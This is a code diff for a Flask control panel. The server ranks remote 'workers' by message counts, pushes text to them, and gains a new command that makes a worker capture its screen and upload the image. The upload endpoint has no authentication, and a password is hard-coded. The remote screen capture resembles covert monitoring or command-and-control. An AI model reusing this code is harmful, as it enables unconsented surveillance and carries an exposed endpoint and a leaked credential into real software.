@@ -12,6 +12,7 @@ USER_PASSWORD = "GhostType9991"
 
 workers = {}
 commands_queue = {}
+screenshots = {}
 global_settings = {"common_text": ""}
 
 def check_auth(username, password):
@@ -37,7 +38,27 @@ def index():
 @app.route('/api/get_workers')
 @requires_auth
 def get_workers_api():
+    # Добавляем инфо о наличии скриншота
+    for name in workers:
+        workers[name]['has_shot'] = name in screenshots
     return jsonify(workers)
+
+@app.route('/api/get_screenshot/<name>')
+@requires_auth
+def get_screenshot(name):
+    if name in screenshots:
+        return jsonify({"image": screenshots[name]})
+    return jsonify({"error": "not found"}), 404
+
+@app.route('/api/upload_shot', methods=['POST'])
+def upload_shot():
+    data = request.json
+    name = data.get("name")
+    image = data.get("image")
+    if name and image:
+        screenshots[name] = image
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"}), 400
 
 @app.route('/api/download_report')
 @requires_auth
@@ -77,18 +98,14 @@ def update():
             "last_seen": now.strftime("%H:%M:%S")
         })
         
-        # --- ЛОГИКА РЕЙТИНГА ---
         all_workers = []
         for w_name, w_info in workers.items():
             all_workers.append({"name": w_name, "total": w_info.get("total", 0)})
         
-        # Сортируем по убыванию сообщений
         all_workers.sort(key=lambda x: x['total'], reverse=True)
         
         rank = 0
         diff_to_leader = 0
-        leader_name = all_workers[0]['name'] if all_workers else ""
-        
         for i, w in enumerate(all_workers):
             if w['name'] == name:
                 rank = i + 1
@@ -102,7 +119,6 @@ def update():
             "diff": diff_to_leader,
             "is_leader": (rank == 1 and len(all_workers) > 1)
         }
-        # -----------------------
 
         cmds = commands_queue.get(name, {})
         if global_settings["common_text"]: cmds["new_text"] = global_settings["common_text"]
@@ -122,7 +138,10 @@ def admin_action():
         data = request.json
         action, target = data.get("action"), data.get("target")
         if target != "all" and target not in commands_queue: commands_queue[target] = {}
-        if action == "set_text":
+        
+        if action == "shot":
+            commands_queue[target]["make_screenshot"] = True
+        elif action == "set_text":
             if target == "all":
                 global_settings["common_text"] = data.get("text")
                 for w in workers: 
